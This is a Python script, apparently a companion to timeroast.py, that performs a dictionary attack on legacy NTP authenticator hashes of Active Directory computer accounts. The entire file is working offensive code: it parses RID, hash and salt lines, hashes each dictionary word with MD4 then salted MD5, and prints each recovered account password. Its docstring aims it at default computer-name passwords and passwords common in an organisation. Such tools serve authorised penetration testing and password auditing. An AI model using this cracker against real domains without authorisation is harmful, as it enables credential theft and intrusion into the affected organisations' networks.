#!/usr/bin/env python3

"""Perform a simple dictionary attack against the output of timeroast.py. Neccessary because the NTP 'hash' format 
unfortunately does not fit into Hashcat or John right now.

Not even remotely optimized, but still useful for cracking legacy default passwords (where the password is the computer 
name) or specific default passwords that are popular in an organisation.
"""

from binascii import hexlify, unhexlify
from argparse import ArgumentParser, FileType, RawDescriptionHelpFormatter
from typing import TextIO, Generator, Tuple
import hashlib, sys, re

HASH_FORMAT = r'^(?P<rid>\d+):\$sntp-ms\$(?P<hashval>[0-9a-f]{32})\$(?P<salt>[0-9a-f]{96})$'

def md4(data : bytes) -> bytes:
  try:
    return hashlib.new('md4', data).digest()
  except ValueError:
    # Use pure-Python implementation by James Seo in case local OpenSSL does not support MD4.
    from md4 import MD4
    return MD4(data).bytes()

def compute_hash(password : str, salt : bytes) -> bytes:
  """Compute a legacy NTP authenticator 'hash'."""
  return hashlib.md5(md4(password.encode('utf-16le')) + salt).digest()
    

def try_crack(hashfile : TextIO, dictfile : TextIO) -> Generator[Tuple[int, str], None, None]:
  # Try each dictionary entry for each hash. dictfile is read iteratively while hashes are stored in RAM.
  hashes = []
  for line in hashfile:
    line = line.strip()
    if line:
      m = re.match(HASH_FORMAT, line)
      if not m:
        print(f'ERROR: invalid hash format: {line}', file=sys.stderr)
        sys.exit(1)
      rid, hashval, salt = m.group('rid', 'hashval', 'salt')
      hashes.append((int(rid), unhexlify(hashval), unhexlify(salt)))
      
  
  for password in dictfile:
    password = password.strip()
    for rid, hashval, salt in hashes:
      if compute_hash(password, salt) == hashval:
        yield rid, password

def main():
  argparser = ArgumentParser(formatter_class=RawDescriptionHelpFormatter, description=\
"""Perform a simple dictionary attack against the output of timeroast.py.

Not even remotely optimized, but still useful for cracking legacy default 
passwords (where the password is the computer name) or specific default 
passwords that are popular in an organisation.
""")

  # Keep hash file as FileType since it's less likely to have encoding issues
  argparser.add_argument('hashes', type=FileType('r'), help='Output of timeroast.py')
  # Change dictionary to just take the filename as a string
  argparser.add_argument('dictionary', type=str, help='Line-delimited password dictionary')
  args = argparser.parse_args()

  crackcount = 0
  
  # Open the dictionary file with proper encoding and error handling
  try:
    with open(args.dictionary, 'r', encoding='utf-8', errors='ignore') as dictfile:
      for rid, password in try_crack(args.hashes, dictfile):
        print(f'[+] Cracked RID {rid} password: {password}')
        crackcount += 1
  except FileNotFoundError:
    print(f'ERROR: Dictionary file not found: {args.dictionary}', file=sys.stderr)
    sys.exit(1)
  except IOError as e:
    print(f'ERROR: Could not read dictionary file: {e}', file=sys.stderr)
    sys.exit(1)

  print(f'\n{crackcount} passwords recovered.')

if __name__ == '__main__':
  main()